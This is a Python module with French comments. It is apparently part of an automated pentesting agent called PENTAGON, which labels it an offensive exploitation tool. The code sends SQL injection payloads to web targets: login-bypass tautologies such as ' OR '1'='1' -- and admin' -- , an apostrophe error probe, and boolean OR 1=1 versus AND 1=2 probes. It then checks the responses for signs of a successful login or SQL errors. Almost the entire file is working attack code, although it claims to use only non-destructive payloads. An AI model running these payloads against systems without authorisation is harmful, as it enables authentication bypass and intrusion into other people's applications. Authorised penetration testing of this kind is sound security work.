"""
Outil de test d'injection SQL (SQLi) pour PENTAGON.

Détecte les injections SQL (OWASP A03) par attaque réelle, sur deux vecteurs
génériques et fiables :

  1. CONTOURNEMENT D'AUTHENTIFICATION : on injecte des charges classiques
     (' OR '1'='1' -- ) dans le formulaire de login ; si la connexion réussit
     avec un identifiant manifestement invalide, l'authentification est
     contournable par SQLi.

  2. INJECTION BASÉE SUR LES ERREURS : on injecte un caractère cassant la
     syntaxe (une apostrophe) dans un paramètre ; si la réponse révèle une
     erreur SQL, le paramètre est concaténé sans protection.

Une vérification booléenne légère (1 OR 1=1 vs 1 AND 1=2) complète la détection
sur les paramètres, avec une confiance moindre (jugée ensuite par l'agent).

Conçu pour être GÉNÉRIQUE : aucune donnée spécifique à une cible. Les cibles
d'injection proviennent de la découverte (endpoint de login, endpoints
paramétrés). Les charges et signatures d'erreur sont universelles.

Catégorie d'action RoE : exploitation (outil offensif).
Standards :
- OWASP A03:2021 (Injection)
- OWASP WSTG-INPV-05 (Testing for SQL Injection)
- CWE-89 (SQL Injection)
- MITRE ATT&CK T1190

GARDE-FOUS ÉTHIQUES — charges STRICTEMENT non destructives :
- On n'utilise QUE des charges de lecture/test (apostrophe, OR 1=1, tautologies
  de login). JAMAIS de requêtes empilées destructrices (DROP/DELETE/UPDATE).
- Nombre de charges limité, délai entre les requêtes.
- Pas d'extraction massive de données : on prouve la faille, on n'aspire rien.
"""

import time
import requests
from datetime import datetime, timezone
from typing import Any


DEFAULT_TIMEOUT = 15
DEFAULT_HEADERS = {"User-Agent": "PENTAGON-Exploitation-Agent/1.0"}

# Charges de CONTOURNEMENT d'authentification (tautologies). Non destructives.
AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "admin' -- ",
    "' OR '1'='1' #",
    '" OR "1"="1',
]

# Charge sondant une erreur de syntaxe (apostrophe simple). Non destructive.
ERROR_PROBE = "'"

# Charges booléennes (vrai vs faux) pour les paramètres numériques.
BOOLEAN_TRUE = " OR 1=1"
BOOLEAN_FALSE = " AND 1=2"

# Champs de formulaire de login courants (génériques).
COMMON_USERNAME_FIELDS = ["username", "email", "user", "login", "userName"]
COMMON_PASSWORD_FIELDS = ["password", "pass", "pwd", "passwd"]

# Clés où chercher un token (signe d'une connexion réussie).
COMMON_TOKEN_KEYS = ["token", "access_token", "accessToken", "jwt", "auth_token", "id_token"]

# Signatures d'erreurs SQL (multi-SGBD). Leur présence trahit une requête
# construite par concaténation non protégée. Inclut les fuites de requête
# verbeuses (ex. message « error executing SQL [SELECT ... ] ») et les
# exceptions ORM/JDBC courantes.
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql", "mysqli", "mysql_fetch", "mysql_num_rows",
    "unclosed quotation mark", "quoted string not properly terminated",
    "syntax error at or near", "pg_query", "postgresql", "psql",
    "ora-00933", "ora-01756", "ora-00921", "oracle error",
    "sqlite3.", "sqlite error", "near \"", "sql syntax",
    "odbc", "sqlstate", "incorrect syntax near", "microsoft sql",
    "system.data.sqlclient", "unterminated quoted string",
    # Fuites de requête / exceptions ORM-JDBC (Spring/Hibernate/Postgres...)
    "error executing sql", "select * from", " ilike ", "could not extract",
    "could not execute", "sqlexception", "jdbc", "org.hibernate",
    "org.postgresql", "psqlexception", "dataintegrityviolation",
    "badsqlgrammar", "queryexception",
]

# Paramètres de requête courants susceptibles d'atteindre une requête SQL
# (recherche, filtre). Génériques.
SEARCH_PARAMS = ["q", "search", "query", "keyword", "term", "name", "filter"]

# Mots indiquant un échec de connexion (pour distinguer un vrai succès).
FAILURE_WORDS = ["invalid", "incorrect", "failed", "error", "unauthorized", "wrong", "denied"]


def run_sqli_test(
    login_url: str | None = None,
    injectable_endpoints: list[str] | None = None,
    search_endpoints: list[str] | None = None,
    token: str | None = None,
    timeout: int = DEFAULT_TIMEOUT,
    delay_between_requests: float = 0.6,
) -> dict[str, Any]:
    """
    Teste l'injection SQL sur un login, des endpoints paramétrés et/ou des
    endpoints de recherche (paramètres de requête).

    Args:
        login_url: URL du login à tester pour le contournement d'auth (optionnel).
        injectable_endpoints: URLs (avec un placeholder {id} ou un segment
            numérique) à tester par injection sur le paramètre de chemin (optionnel).
        search_endpoints: URLs à tester par injection sur un paramètre de
            requête (?q=, ?search=...) — typiquement les endpoints de recherche.
        token: token d'authentification à présenter sur les endpoints protégés.
        timeout: délai d'attente par requête.
        delay_between_requests: délai éthique entre requêtes.

    Returns:
        Dict structuré avec les résultats et les findings SQLi.
    """
    started_at = datetime.now(timezone.utc)

    result: dict[str, Any] = {
        "tool": "sqli_tester",
        "status": "success",
        "login_url": login_url,
        "endpoints_tested": 0,
        "results": [],
        "sqli_findings": [],
        "duration_seconds": None,
        "error": None,
    }

    headers = dict(DEFAULT_HEADERS)
    if token and not token.lower().startswith("bearer "):
        headers["Authorization"] = f"Bearer {token}"
    elif token:
        headers["Authorization"] = token

    try:
        # === Vecteur 1 : contournement d'authentification sur le login ===
        if login_url:
            login_outcome = _test_login_sqli(login_url, timeout, delay_between_requests)
            result["results"].append(login_outcome)
            result["endpoints_tested"] += 1
            result["sqli_findings"].extend(login_outcome.get("findings", []))

        # === Vecteur 2 : injection sur les paramètres de chemin des endpoints ===
        for endpoint in (injectable_endpoints or []):
            param_outcome = _test_param_sqli(
                endpoint, headers, timeout, delay_between_requests
            )
            if param_outcome is None:
                continue
            result["results"].append(param_outcome)
            result["endpoints_tested"] += 1
            result["sqli_findings"].extend(param_outcome.get("findings", []))

        # === Vecteur 3 : injection sur les paramètres de requête (recherche) ===
        for endpoint in (search_endpoints or []):
            query_outcome = _test_query_param_sqli(
                endpoint, headers, timeout, delay_between_requests
            )
            result["results"].append(query_outcome)
            result["endpoints_tested"] += 1
            result["sqli_findings"].extend(query_outcome.get("findings", []))

    except Exception as e:
        result["status"] = "error"
        result["error"] = f"{type(e).__name__}: {str(e)}"

    ended_at = datetime.now(timezone.utc)
    result["duration_seconds"] = (ended_at - started_at).total_seconds()

    return result


def _test_login_sqli(login_url: str, timeout: int, delay: float) -> dict[str, Any]:
    """
    Teste le login pour : (a) contournement d'auth par tautologie, (b) erreur SQL.
    """
    outcome: dict[str, Any] = {
        "vector": "auth_bypass",
        "target": login_url,
        "tested_payloads": 0,
        "findings": [],
        "notes": [],
    }

    user_field = COMMON_USERNAME_FIELDS[0]
    pass_field = COMMON_PASSWORD_FIELDS[0]

    # (a) Contournement d'authentification
    for payload in AUTH_BYPASS_PAYLOADS:
        outcome["tested_payloads"] += 1
        try:
            response = requests.post(
                login_url,
                json={user_field: payload, pass_field: "pentagon_invalid_pw"},
                headers=DEFAULT_HEADERS,
                timeout=timeout,
            )
        except requests.RequestException as e:
            outcome["notes"].append(f"Erreur réseau : {type(e).__name__}")
            time.sleep(delay)
            continue

        if _looks_like_login_success(response):
            outcome["findings"].append({
                "title": "Contournement d'authentification par injection SQL",
                "severity": "critical",
                "owasp": "A03:2021 Injection",
                "cwe": "CWE-89",
                "mitre": "T1190",
                "vector": "auth_bypass",
                "target": login_url,
                "evidence": "Connexion réussie avec une charge d'injection en guise "
                            "d'identifiant (tautologie SQL) — l'authentification est "
                            "contournable sans mot de passe valide.",
            })
            break  # preuve obtenue, inutile d'insister
        time.sleep(delay)

    # (b) Erreur SQL sur le champ de login
    try:
        response = requests.post(
            login_url,
            json={user_field: f"x{ERROR_PROBE}", pass_field: f"x{ERROR_PROBE}"},
            headers=DEFAULT_HEADERS,
            timeout=timeout,
        )
        if _has_sql_error(response.text):
            outcome["findings"].append({
                "title": "Injection SQL basée sur les erreurs (login)",
                "severity": "high",
                "owasp": "A03:2021 Injection",
                "cwe": "CWE-89",
                "mitre": "T1190",
                "vector": "error_based",
                "target": login_url,
                "evidence": "Une apostrophe injectée dans le champ de login provoque "
                            "une erreur SQL dans la réponse (concaténation non protégée).",
            })
    except requests.RequestException:
        pass
    time.sleep(delay)

    return outcome


def _test_param_sqli(
    endpoint: str,
    headers: dict[str, str],
    timeout: int,
    delay: float,
) -> dict[str, Any] | None:
    """
    Teste un endpoint paramétré : injection basée sur les erreurs + booléenne.

    Le placeholder {id} (ou un segment numérique) est remplacé par les charges.
    """
    # Détermine la valeur de base et comment injecter
    if "{id}" in endpoint:
        def build(value: str) -> str:
            return endpoint.replace("{id}", value)
    else:
        # Pas de placeholder explicite : on tente d'injecter sur un segment
        # numérique terminal (ex. /api/users/1 → /api/users/1')
        import re
        if not re.search(r"/\d+($|\?)", endpoint):
            return None
        def build(value: str) -> str:
            return re.sub(r"/(\d+)($|\?)", lambda m: "/" + value + m.group(2), endpoint, count=1)

    outcome: dict[str, Any] = {
        "vector": "param_injection",
        "target": endpoint,
        "findings": [],
        "notes": [],
    }

    # Référence (identifiant légitime)
    try:
        baseline = requests.get(build("1"), headers=headers, timeout=timeout)
    except requests.RequestException as e:
        outcome["notes"].append(f"Référence injoignable : {type(e).__name__}")
        return outcome
    time.sleep(delay)

    # (a) Erreur SQL : on injecte une apostrophe
    try:
        err = requests.get(build("1" + ERROR_PROBE), headers=headers, timeout=timeout)
        if _has_sql_error(err.text) and not _has_sql_error(baseline.text):
            outcome["findings"].append({
                "title": "Injection SQL basée sur les erreurs (paramètre)",
                "severity": "critical",
                "owasp": "A03:2021 Injection",
                "cwe": "CWE-89",
                "mitre": "T1190",
                "vector": "error_based",
                "target": endpoint,
                "evidence": "Une apostrophe injectée dans le paramètre provoque une "
                            "erreur SQL absente de la réponse de référence.",
            })
            time.sleep(delay)
            return outcome  # erreur = preuve forte, on s'arrête
    except requests.RequestException:
        pass
    time.sleep(delay)

    # (b) Booléen : vrai (1 OR 1=1) vs faux (1 AND 1=2)
    try:
        r_true = requests.get(build("1" + BOOLEAN_TRUE), headers=headers, timeout=timeout)
        time.sleep(delay)
        r_false = requests.get(build("1" + BOOLEAN_FALSE), headers=headers, timeout=timeout)
        # Signal : 'vrai' ressemble à la référence (200 + contenu), 'faux' diffère
        # nettement (statut différent ou taille très différente).
        if (baseline.status_code == 200 and r_true.status_code == 200
                and _significantly_different(r_true, r_false)):
            outcome["findings"].append({
                "title": "Injection SQL aveugle booléenne (paramètre)",
                "severity": "high",
                "owasp": "A03:2021 Injection",
                "cwe": "CWE-89",
                "mitre": "T1190",
                "vector": "boolean_based",
                "target": endpoint,
                "confidence": 0.6,
                "evidence": "Une condition vraie (OR 1=1) et une condition fausse "
                            "(AND 1=2) injectées produisent des réponses nettement "
                            "différentes — comportement typique d'une SQLi aveugle. "
                            "À confirmer (confiance modérée).",
            })
    except requests.RequestException:
        pass
    time.sleep(delay)

    return outcome


def _test_query_param_sqli(
    url: str,
    headers: dict[str, str],
    timeout: int,
    delay: float,
) -> dict[str, Any]:
    """
    Teste l'injection SQL sur les paramètres de requête d'un endpoint (ex. la
    recherche /api/products/search?q=...).

    Pour chaque nom de paramètre courant, on compare une valeur bénigne à la
    même valeur suivie d'une apostrophe : si l'apostrophe déclenche une erreur
    SQL (ou une fuite de requête) absente du cas bénin, le paramètre est injectable.
    """
    outcome: dict[str, Any] = {
        "vector": "query_param",
        "target": url,
        "tested_params": 0,
        "findings": [],
        "notes": [],
    }

    sep = "&" if "?" in url else "?"

    for param in SEARCH_PARAMS:
        outcome["tested_params"] += 1
        try:
            benign = requests.get(f"{url}{sep}{param}=test", headers=headers, timeout=timeout)
        except requests.RequestException:
            time.sleep(delay)
            continue
        time.sleep(delay)

        try:
            inject = requests.get(f"{url}{sep}{param}=test'", headers=headers, timeout=timeout)
        except requests.RequestException:
            time.sleep(delay)
            continue

        if _has_sql_error(inject.text) and not _has_sql_error(benign.text):
            outcome["findings"].append({
                "title": "Injection SQL sur un paramètre de recherche",
                "severity": "critical",
                "owasp": "A03:2021 Injection",
                "cwe": "CWE-89",
                "mitre": "T1190",
                "vector": "query_param",
                "target": url,
                "parameter": param,
                "evidence": f"Une apostrophe injectée dans le paramètre '{param}' "
                            "déclenche une erreur SQL (ou une fuite de requête) "
                            "absente de la requête bénigne — le paramètre est "
                            "concaténé dans une requête SQL sans protection.",
            })
            time.sleep(delay)
            break  # preuve obtenue sur cet endpoint
        time.sleep(delay)

    return outcome


def _looks_like_login_success(response: requests.Response) -> bool:
    """Détermine si une réponse de login correspond à un succès."""
    if response.status_code not in (200, 201):
        return False
    try:
        data = response.json()
        if isinstance(data, dict):
            for key in COMMON_TOKEN_KEYS:
                if key in data and data[key]:
                    return True
            body = str(data).lower()
            return not any(w in body for w in FAILURE_WORDS)
    except ValueError:
        body = response.text.lower()
        return not any(w in body for w in FAILURE_WORDS)
    return False


def _has_sql_error(text: str) -> bool:
    """Cherche une signature d'erreur SQL dans le texte d'une réponse."""
    if not text:
        return False
    low = text.lower()
    return any(sig in low for sig in SQL_ERROR_SIGNATURES)


def _significantly_different(r1: requests.Response, r2: requests.Response) -> bool:
    """
    Estime si deux réponses diffèrent nettement (statut ou taille).

    Conservateur, pour limiter les faux positifs sur du contenu dynamique.
    """
    if r1.status_code != r2.status_code:
        return True
    len1, len2 = len(r1.content), len(r2.content)
    larger = max(len1, len2) or 1
    # Différence de taille > 30 % = nette
    return abs(len1 - len2) / larger > 0.30
